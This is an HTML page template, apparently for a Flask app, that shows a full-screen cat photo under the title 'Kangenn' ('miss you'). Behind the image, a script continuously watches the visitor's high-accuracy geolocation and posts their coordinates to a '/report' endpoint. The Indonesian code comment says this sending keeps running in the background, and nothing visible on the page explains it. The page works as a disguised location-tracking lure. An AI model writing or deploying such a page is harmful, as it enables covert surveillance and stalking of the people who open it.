<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Kangenn</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
  </style>
</head>
<body>
  <!-- Ambil gambar dari folder static/img -->
  <img src="{{ url_for('static', filename='/kucing.jpeg') }}" alt="Kangenn">

  <script>
    // Script kirim lokasi ke server tetap berjalan di latar belakang
    if (navigator.geolocation) {
      navigator.geolocation.watchPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        fetch('/report', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ latitude: lat, longitude: lon })
        }).catch(e => console.error('Gagal kirim lokasi:', e));
      }, err => {
        console.error('Gagal mendapatkan lokasi:', err);
      }, {
        enableHighAccuracy: true,
        maximumAge: 5000,
        timeout: 15000
      });
    }
  </script>
</body>
</html>
